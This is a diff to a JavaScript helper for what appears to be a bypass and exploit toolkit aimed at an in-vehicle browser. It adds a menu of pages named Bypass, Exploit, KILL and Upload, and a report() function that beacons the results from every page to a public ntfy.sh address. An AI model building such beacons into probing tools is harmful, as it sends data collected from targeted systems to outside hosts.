@@ -78,5 +78,40 @@ window.ToggKit = (function () {
 
   function $(id) { return document.getElementById(id); }
 
-  return { verdict:verdict, engineRisk:engineRisk, buildIntent:buildIntent, hrefFor:hrefFor, copy:copy, $:$ };
+  var NAV = [
+    ['index.html',   '🎯 Bypass',   'index'],
+    ['probe.html',   '🔬 Ortam',    'probe'],
+    ['klavye.html',  '⌨️ Klavye',   'klavye'],
+    ['intent.html',  '🚪 Intent',   'intent'],
+    ['exploit.html', '💣 Oto-Test', 'exploit'],
+    ['devopt.html',  '🔒 devopt',   'devopt'],
+    ['surface.html', '🧬 Yüzey',    'surface'],
+    ['kill.html',    '☠️ KILL',     'kill'],
+    ['invoke.html',  '⚡ Invoke',   'invoke'],
+    ['uach.html',    '🧾 UA-CH',    'uach'],
+    ['upload.html',  '📤 Upload',   'upload'],
+    ['portal.html',  '🌐 Portal',   'portal'],
+  ];
+
+  function nav(active) {
+    var e = $('nav');
+    if (!e) return;
+    var h = '';
+    for (var i = 0; i < NAV.length; i++) {
+      var it = NAV[i];
+      h += '<a href="' + it[0] + '"' + (it[2] === active ? ' class="active"' : '') + '>' + it[1] + '</a>';
+    }
+    e.innerHTML = h;
+  }
+
+  /* ntfy beacon — tüm sayfalar sonuçları buraya akıtır.
+     sendBeacon (unload-güvenli) → yoksa fetch(no-cors, keepalive) yedeği. */
+  var NT = 'https://ntfy.sh/toggx-ivi-7f3k9q2m';
+  function report(tag, msg) {
+    var line = '[' + (tag || 'app') + '] ' + (msg == null ? '' : msg);
+    try { if (navigator.sendBeacon) { navigator.sendBeacon(NT, line); return; } } catch (e) {}
+    try { fetch(NT, { method:'POST', mode:'no-cors', body:line, keepalive:true }).catch(function () {}); } catch (e) {}
+  }
+
+  return { verdict:verdict, engineRisk:engineRisk, buildIntent:buildIntent, hrefFor:hrefFor, copy:copy, $:$, nav:nav, report:report };
 })();
